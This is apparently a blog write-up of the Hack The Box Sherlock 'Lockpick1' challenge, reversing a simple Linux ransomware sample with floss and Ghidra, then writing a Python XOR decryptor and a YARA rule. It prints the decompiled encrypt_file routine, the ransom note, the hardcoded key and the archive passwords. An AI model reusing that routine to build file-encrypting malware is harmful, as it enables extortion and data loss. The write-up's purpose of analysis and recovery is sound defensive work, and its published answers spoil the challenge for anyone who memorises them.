---
title: "HTB Sherlock Lockpick1"
date: 2024-06-15T04:33:24-04:00
tags:
  - htb
  - sherlock
  - malware
  - floss
  - jq
  - ghidra
  - cryptography
  - ransomware
  - file-recovery
  - static-analysis
  - reverse-engineering
  - virustotal
---

# Lockpick 1 - Malware Analysis

### Scenario
Forela needs your help! A whole portion of our UNIX servers have been hit with what we think is ransomware. We are refusing to pay the attackers and need you to find a way to recover the files provided. Warning This is a warning that this Sherlock includes software that is going to interact with your computer and files. This software has been intentionally included for educational purposes and is NOT intended to be executed or used otherwise. Always handle such files in isolated, controlled, and secure environments. Once the Sherlock zip has been unzipped, you will find a DANGER.txt file. Please read this to proceed.

### Artifacts
|Artifact|MD5 Hash|Password|
|----|----|----|
|lockpick1.zip|e14430ea647d948e3084931652f5e534|hacktheblue|
|bescrypt.zip|ab7388c8a51ea6c8b53cbc11bfd463f2|E@iwyzXK7HK&|

### Tools
+ [flare-floss](https://github.com/mandiant/flare-floss): For static malware analysis.
+ [jq](https://github.com/jqlang/jq): For querying JSON files.
+ [Ghidra SRE](https://github.com/NationalSecurityAgency/ghidra): For reverse engineering the malware and static analysis.
+ Sublime Text Editor
+ xxd Hex Editor
+ Visual Studio Code

### Tasks
1. Please confirm the encryption key string utilised for the encryption of the files provided?
2. We have recently received an email from wbevansn1@cocolog-nifty.com demanding to know the first and last name we have him registered as. They believe they made a mistake in the application process. Please confirm the first and last name of this applicant.
3. What is the MAC address and serial number of the laptop assigned to Hart Manifould?
4. What is the email address of the attacker?
5. City of London Police have suspiciouns of some insider trading taking part within our trading organisation. Please confirm the email address of the person with the highest profit percentage in a single trade alongside the profit percentage.
6. Our E-Discovery team would like to confirm the IP address detailed in the Sales Forecast log for a user who is suspected of sharing their account with a colleague. Please confirm the IP address for Karylin O'Hederscoll.
7. Which of the following file extensions is not targeted by the malware? `.txt, .sql, .ppt, .pdf, .docx, .xlsx, .csv, .json, .xml`
8. We need to confirm the integrity of the files once decrypted. Please confirm the MD5 hash of the applicants DB.
9. We need to confirm the integrity of the files once decrypted. Please confirm the MD5 hash of the trading backup.
10. We need to confirm the integrity of the files once decrypted. Please confirm the MD5 hash of the complaints file.

### Malware Analysis
We have been given a directory `forela-criticaldata` that contains encrypted internal files by a ransomware. The sample of the ransomware is also given in a separate zip file `bescrypt.zip`. Our objective is to recover the encrypted files by analyzing the malware.
#### Static Analysis
First, let's see what kind of binary we are dealing with.
```sh
$ file bescrypt3.2               
bescrypt3.2: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2b6eafade391d7be39a8aff0d2e3a60aa8b6a4c2, for GNU/Linux 3.2.0, not stripped
```

It's an ELF 64-bit binary. You can read more about ELF binary in the Medium article mentioned in the reference section.

Binary Headers
```sh
$ readelf -h bescrypt3.2
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              DYN (Position-Independent Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x1160
  Start of program headers:          64 (bytes into file)
  Start of section headers:          14904 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         13
  Size of section headers:           64 (bytes)
  Number of section headers:         31
  Section header string table index: 30
```

Let's use floss and try to dump the strings of the binary.
```sh
$ floss bescrypt3.2 --format sc64
INFO: floss: extracting static strings
finding decoding function features: 100%|█████| 1/1 [00:00<00:00, 498.08 functions/s, skipped 0 library functions]
INFO: floss.stackstrings: extracting stackstrings from 1 functions
extracting stackstrings: 100%|█████████████████████████████████████████████| 1/1 [00:00<00:00, 151.76 functions/s]
INFO: floss.tightstrings: extracting tightstrings from 0 functions...
extracting tightstrings: 0 functions [00:00, ? functions/s]
INFO: floss.string_decoder: decoding strings
decoding strings: 100%|████████████████████████████████████████████████████| 1/1 [00:00<00:00, 289.22 functions/s]
INFO: floss: finished execution after 3.23 seconds
INFO: floss: rendering results


FLARE FLOSS RESULTS (version 3.1.0)

+------------------------+------------------------------------------------------------------------------------+
| file path              | bescrypt3.2                                                                        |
| identified language    | unknown                                                                            |
| extracted strings      |                                                                                    |
|  static strings        | 127 (1700 characters)                                                              |
|   language strings     |   0 (   0 characters)                                                              |
|  stack strings         | 0                                                                                  |
|  tight strings         | 0                                                                                  |
|  decoded strings       | 0                                                                                  |
+------------------------+------------------------------------------------------------------------------------+


 ──────────────────────────── 
  FLOSS STATIC STRINGS (127)  
 ──────────────────────────── 

+-----------------------------------+
| FLOSS STATIC STRINGS: ASCII (127) |
+-----------------------------------+

/lib64/ld-linux-x86-64.so.2
rewind
snprintf
free
fread
closedir
fopen
strlen
strstr
malloc
__libc_start_main
remove
__cxa_finalize
ftell
readdir
fclose
opendir
fwrite
strcmp
fseek
libc.so.6
GLIBC_2.34
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
ATSH
[A\]
Error opening file: %s
%s.24bes
%s_note.txt
This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com to discuss payment for us providing you the decryption software..
Error creating note file: %s
Error deleting original file: %s
Error opening directory: %s
%s/%s
.txt
.sql
.pdf
.docx
.xlsx
.csv
.json
.xml
Encrypting: %s
bhUlIshutrea98liOp
/forela-criticaldata/
;*3$"
GCC: (Debian 12.2.0-13) 12.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
bescrypt2.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
free@GLIBC_2.2.5
__libc_start_main@GLIBC_2.34
remove@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
fread@GLIBC_2.2.5
_edata
fclose@GLIBC_2.2.5
opendir@GLIBC_2.2.5
_fini
strlen@GLIBC_2.2.5
rewind@GLIBC_2.2.5
snprintf@GLIBC_2.2.5
closedir@GLIBC_2.2.5
__data_start
strcmp@GLIBC_2.2.5
ftell@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
readdir@GLIBC_2.2.5
malloc@GLIBC_2.2.5
_end
fseek@GLIBC_2.2.5
__bss_start
main
encrypt_file
process_directory
fopen@GLIBC_2.2.5
fwrite@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
strstr@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment


+------------------------------------+
| FLOSS STATIC STRINGS: UTF-16LE (0) |
+------------------------------------+



 ───────────────────────── 
  FLOSS STACK STRINGS (0)  
 ───────────────────────── 



 ───────────────────────── 
  FLOSS TIGHT STRINGS (0)  
 ───────────────────────── 



 ─────────────────────────── 
  FLOSS DECODED STRINGS (0)  
 ─────────────────────────── 
```

We can see the structure of the ELF binary, the function names it has, and some hard coded strings. Most Interesting ones are listed below:

Hard coded strings:
```text
Error opening file: %s
%s.24bes
%s_note.txt
This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com to discuss payment for us providing you the decryption software..
Error creating note file: %s
Error deleting original file: %s
Error opening directory: %s
%s/%s
.txt
.sql
.pdf
.docx
.xlsx
.csv
.json
.xml
Encrypting: %s
bhUlIshutrea98liOp
/forela-criticaldata/
```

We found the encryption key which is `bhUlIshutrea98liOp`. Now, we need to figure out what kind of encryption we are dealing with.

C header files and functions load order:
```text
GCC: (Debian 12.2.0-13) 12.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
bescrypt2.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
free@GLIBC_2.2.5
__libc_start_main@GLIBC_2.34
remove@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
fread@GLIBC_2.2.5
_edata
fclose@GLIBC_2.2.5
opendir@GLIBC_2.2.5
_fini
strlen@GLIBC_2.2.5
rewind@GLIBC_2.2.5
snprintf@GLIBC_2.2.5
closedir@GLIBC_2.2.5
__data_start
strcmp@GLIBC_2.2.5
ftell@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
readdir@GLIBC_2.2.5
malloc@GLIBC_2.2.5
_end
fseek@GLIBC_2.2.5
__bss_start
main
encrypt_file
process_directory
fopen@GLIBC_2.2.5
fwrite@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
strstr@GLIBC_2.2.5
```

We discovered an interesting function named `encrypt_file`. Let's decompile the binary and look at the function's source code using `ghidra`.

encrypt_file
```c
void encrypt_file(char *param_1,char *param_2)

{
  byte bVar1;
  ulong uVar2;
  int iVar3;
  size_t sVar4;
  char local_848 [1024];
  char local_448 [1032];
  FILE *local_40;
  void *local_38;
  size_t local_30;
  FILE *local_28;
  ulong local_20;
  
  local_28 = fopen(param_1,"rb");
  if (local_28 == (FILE *)0x0) {
    printf("Error opening file: %s\n",param_1);
  }
  else {
    fseek(local_28,0,2);
    local_30 = ftell(local_28);
    rewind(local_28);
    local_38 = malloc(local_30);
    fread(local_38,1,local_30,local_28);
    fclose(local_28);
    for (local_20 = 0; uVar2 = local_20, (long)local_20 < (long)local_30; local_20 = local_20 + 1) {
      bVar1 = *(byte *)((long)local_38 + local_20);
      sVar4 = strlen(param_2);
      *(byte *)((long)local_38 + local_20) = bVar1 ^ param_2[uVar2 % sVar4];
    }
    snprintf(local_448,0x400,"%s.24bes",param_1);
    local_28 = fopen(local_448,"wb");
    fwrite(local_38,1,local_30,local_28);
    fclose(local_28);
    free(local_38);
    snprintf(local_848,0x400,"%s_note.txt",local_448);
    local_40 = fopen(local_848,"w");
    if (local_40 == (FILE *)0x0) {
      printf("Error creating note file: %s\n",local_848);
    }
    else {
      fwrite("This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com  to discuss payment for us providing you the decryption software..\n"
             ,1,0x99,local_40);
      fclose(local_40);
    }
    iVar3 = remove(param_1);
    if (iVar3 != 0) {
      printf("Error deleting original file: %s\n",param_1);
    }
  }
  return;
}
```

Looks like XOR encryption mechanism. I used ChatGPT to describe the function's source code. I got the following response.
Sure, let’s go through this C function `encrypt_file` step by step to understand how it works.

##### Function Purpose
The `encrypt_file` function reads a file, encrypts its content using a provided key, writes the encrypted content to a new file, and creates a note file indicating the file has been encrypted.

##### Function Parameters
- `char *param_1`: The name (or path) of the file to be encrypted.
- `char *param_2`: The encryption key used to encrypt the file content.

##### Local Variables
- `byte bVar1`: A byte variable used in the encryption process.
- `ulong uVar2`: A variable used in the encryption process for indexing.
- `int iVar3`: An integer to check the result of removing the original file.
- `size_t sVar4`: Size variable used to store the length of the encryption key.
- `char local_848[1024]`: A buffer to store the name of the note file.
- `char local_448[1032]`: A buffer to store the name of the encrypted file.
- `FILE *local_40`: File pointer for creating the note file.
- `void *local_38`: Pointer to dynamically allocated memory for reading the file content.
- `size_t local_30`: Variable to store the size of the file being read.
- `FILE *local_28`: File pointer for the file being read and the encrypted file being written.
- `ulong local_20`: Loop counter used in the encryption process.

##### Step-by-Step Explanation

1. **Open the Original File**:
   ```c
   local_28 = fopen(param_1, "rb");
   ```
   - Attempts to open the file specified by `param_1` in binary read mode.
   - If the file cannot be opened, it prints an error message.

2. **Read the File Content**:
   ```c
   fseek(local_28, 0, 2);
   local_30 = ftell(local_28);
   rewind(local_28);
   local_38 = malloc(local_30);
   fread(local_38, 1, local_30, local_28);
   fclose(local_28);
   ```
   - Seeks to the end of the file to determine its size (`local_30`).
   - Allocates memory to `local_38` to hold the file content.
   - Reads the file content into `local_38`.
   - Closes the original file.

3. **Encrypt the File Content**:
   ```c
   for (local_20 = 0; uVar2 = local_20, (long)local_20 < (long)local_30; local_20 = local_20 + 1) {
       bVar1 = *(byte *)((long)local_38 + local_20);
       sVar4 = strlen(param_2);
       *(byte *)((long)local_38 + local_20) = bVar1 ^ param_2[uVar2 % sVar4];
   }
   ```
   - Iterates through each byte of the file content.
   - Encrypts each byte by XORing it with a byte from the encryption key `param_2`. The key is used in a cyclic manner.

4. **Write the Encrypted Content to a New File**:
   ```c
   snprintf(local_448, 0x400, "%s.24bes", param_1);
   local_28 = fopen(local_448, "wb");
   fwrite(local_38, 1, local_30, local_28);
   fclose(local_28);
   free(local_38);
   ```
   - Constructs the name for the encrypted file by appending ".24bes" to the original filename.
   - Opens the new file in binary write mode.
   - Writes the encrypted content to this new file.
   - Closes the new file and frees the allocated memory.

5. **Create a Note File**:
   ```c
   snprintf(local_848, 0x400, "%s_note.txt", local_448);
   local_40 = fopen(local_848, "w");
   if (local_40 == (FILE *)0x0) {
       printf("Error creating note file: %s\n", local_848);
   }
   else {
       fwrite("This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com to discuss payment for us providing you the decryption software..\n", 1, 0x99, local_40);
       fclose(local_40);
   }
   ```
   - Constructs the name for the note file by appending "_note.txt" to the encrypted file name.
   - Opens the note file in write mode.
   - Writes a ransom note to the note file.
   - Closes the note file.

6. **Delete the Original File**:
   ```c
   iVar3 = remove(param_1);
   if (iVar3 != 0) {
       printf("Error deleting original file: %s\n", param_1);
   }
   ```
   - Attempts to delete the original file.
   - If deletion fails, it prints an error message.

##### Function's Purpose
The `encrypt_file` function encrypts the content of a specified file using a provided key and saves the encrypted content to a new file with a ".24bes" extension. It also creates a note file containing a message from the "bes24 group," and then attempts to delete the original file. This function mimics the behavior of ransomware.

Using the help of ChatGPT I created the following decryption tool in Python.
**Decryptor Tool**
```python
import os
import sys

def decrypt_file(encrypted_file: str, decryption_key: str):
    try:
        # Open the encrypted file for reading in binary mode
        with open(encrypted_file, 'rb') as ef:
            encrypted_data = ef.read()
        
        # Prepare the decryption key
        key_length = len(decryption_key)
        
        # Decrypt the data
        decrypted_data = bytearray()
        for i in range(len(encrypted_data)):
            decrypted_byte = encrypted_data[i] ^ ord(decryption_key[i % key_length])
            decrypted_data.append(decrypted_byte)
        
        # Prepare the output file name by removing the .24bes extension
        output_file = encrypted_file.replace('.24bes', '')
        
        # Write the decrypted data to the output file
        with open(output_file, 'wb') as df:
            df.write(decrypted_data)
        
        print(f"File decrypted successfully: {encrypted_file} -> {output_file}")
    except FileNotFoundError:
        print(f"Error: The file {encrypted_file} does not exist.")
    except Exception as e:
        print(f"An error occurred: {e}")

def decrypt_directory(directory: str, decryption_key: str):
    # Get all files in the directory with .24bes extension
    for filename in os.listdir(directory):
        if filename.endswith('.24bes'):
            encrypted_file_path = os.path.join(directory, filename)
            decrypt_file(encrypted_file_path, decryption_key)

# Hardcoded decryption key
DECRYPTION_KEY = "bhUlIshutrea98liOp"

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python decrypt_files.py <directory>")
        sys.exit(1)
    
    directory = sys.argv[1]
    
    if not os.path.isdir(directory):
        print(f"Error: {directory} is not a valid directory.")
        sys.exit(1)
    
    decrypt_directory(directory, DECRYPTION_KEY)
```

Using this tool we were successful in decrypting the files of the `forela-criticaldata` directory.

#### VirusTotal
![virustotal score](images/20240619191644.png)
[VirusTotal - Analysis](https://www.virustotal.com/gui/file/19ad47d6e0a43e77e1d23534404bd7bb7f0742b961ef2b219160c9ef3945572d/details)

#### YARA Rule
This is my first yara rule. So, please forgive if it's not good.
```yar
rule Bes24Ransomware
{
    meta:
        description = "Detects Bes24 Ransomware"
        author = "Shakil Hossain"
        date = "2024-06-19"
        version = "1.0"
        hash = "19ad47d6e0a43e77e1d23534404bd7bb7f0742b961ef2b219160c9ef3945572d"
        score = 32
        id = "fcaf0277-67bc-512a-97ff-4e8b30190eef"
        
    strings:
        $str1 = "This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com to discuss payment for us providing you the decryption software.."
        $str2 = ".24bes"
        $str3 = "_note.txt"
        $str4 = "bes24@protonmail.com"
    
    condition:
        filesize < 20KB
        and
        any of ($str*)
}
```

After recovering the files we accomplished our objectives. Now let's answer the tasks.

#### Task Solution
1. For task one we already have the encryption key listed above.
2. We can find the answer in the `forela_uk_applicants.sql` file.
3. We can find it in the `it_assets.xml` file.
4. We can find it in any file with the `.24bes_note.txt` extension.
5. To find this answer we can use `jq` with following query: `jq 'to_entries | map(.value) | max_by(.profit_percentage) | {email, profit_percentage}' trading-firebase_bkup.json`
6. We can find this in the `sales_forecast.xlsx` file.
7. Also we can find this answer in the hard coded strings section.
8. Doing an `md5sum` on the file `orela_uk_applicants.sql` will get you the answer.
9. Doing an `md5sum` on the file `trading-firebase_bkup.json` will get you the answer.
10. Doing an `md5sum` on the file `complaints.csv` will get you the answer.

```ad-tip
Please calculate the hashes for the file without modifying the file. You may feel tempting to format a file for better visibility. For forensic purpose make a copy of the original file then do operation on it.
```

### Summary
This was my first malware analysis Sherlock, where I reversed a very simple ransomware. I did static analysis on the binary and found the encryption key and encryption algorithm which facilitate the creation of a decryption tool and recover the business critical files. I also created an YARA rule to detect this malware. It was fun.

### References
+ [Basics of ELF (Executable and Linkable Format) file by Ajmewal - Medium](https://medium.com/@ajmewal/basics-of-elf-executable-and-linkable-format-file-88a516877356)
+ [YARA UUID Generator using Hash](https://github.com/Neo23x0/yara-uuid-generator)
+ [Mastering YARA Rules: Malware Detection and Analysis - Veeam](https://www.veeam.com/blog/yara-rules-malware-detection-analysis.html)